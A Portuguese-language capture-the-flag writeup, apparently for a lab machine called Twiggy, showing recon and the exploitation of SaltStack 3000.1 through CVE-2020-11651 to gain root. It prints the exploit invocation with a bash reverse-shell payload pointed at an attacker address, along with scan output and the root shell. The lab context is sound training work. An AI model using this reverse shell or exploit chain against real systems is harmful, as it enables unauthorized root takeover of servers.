---
layout: writeup
title: Twiggy
platform: pg
difficulty: easy
os: linux
---

> **Dificuldade**: Fácil (opinião: médio)
{: .prompt-info }

> Writeup importado do Notion. Imagens originais omitidas.
{: .prompt-tip }

## 1. Escaneamento

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4
53/tcp   open  domain  (generic dns response: NOTIMP)
80/tcp   open  http    nginx 1.16.1 (Mezzanine CMS)
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1 (salt-api/3000-1)
```

ZeroMQ nas portas 4505/4506 + `X-Upstream: salt-api/3000-1` = **SaltStack**.

## 2. Enumeração

### Web (8000) — salt-api detection

```bash
curl -v http://192.168.160.62:8000
```

Response header revela: `X-Upstream: salt-api/3000-1`. Body retorna JSON com clients suportados (`local`, `runner`, `ssh`, `wheel`, etc.) — confirma SaltStack API exposta.

## 3. Acesso Inicial — CVE-2020-11651

SaltStack 3000.1 vulnerável a **CVE-2020-11651 / CVE-2020-11652** — autenticação bypass + path traversal permitindo RCE no master via ZMQ ports.

### Setup do exploit

```bash
pip3 install salt
pip3 install markupsafe==2.0.1  # downgrade necessário para compatibilidade
```

Exploit público (CVE-2020-11651.py) executa comando arbitrário no master:

```bash
python3 CVE-2020-11651.py 192.168.160.62 master \
  '/bin/bash -i >& /dev/tcp/192.168.49.160/4505 0>&1'
```

```
Attempting to ping master at 192.168.160.62
Retrieved root key: 3J+XIUkNF7hBV4vmBMThrOVNtk/MMCHmT7QoUZ9lmQL9u4EJafv/kEAnCeEpdZRrgO7g2dEL2Ho=
Got response for attempting master shell: {'jid': '...', 'tag': 'salt/run/...'}. Looks promising!
```

## 4. Resultado

Shell reverso recebido **como root** diretamente — o master Salt roda com privilégios root e o exploit injeta comando arbitrário antes de qualquer autenticação.

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Resumo da Cadeia

| Etapa | Técnica |
|-------|---------|
| Recon | nmap → ZMQ + salt-api identificados |
| Vuln | SaltStack 3000.1 → CVE-2020-11651 (auth bypass) |
| Exploit | CVE-2020-11651.py com payload reverse shell bash |
| Resultado | Shell root direto (master roda como root) — sem privesc |

> **Lição:** SaltStack expõe ZMQ ports (4505/4506) e API HTTP (8000) sem autenticação se misconfigurado. Sempre validar versão e patch level.
{: .prompt-tip }
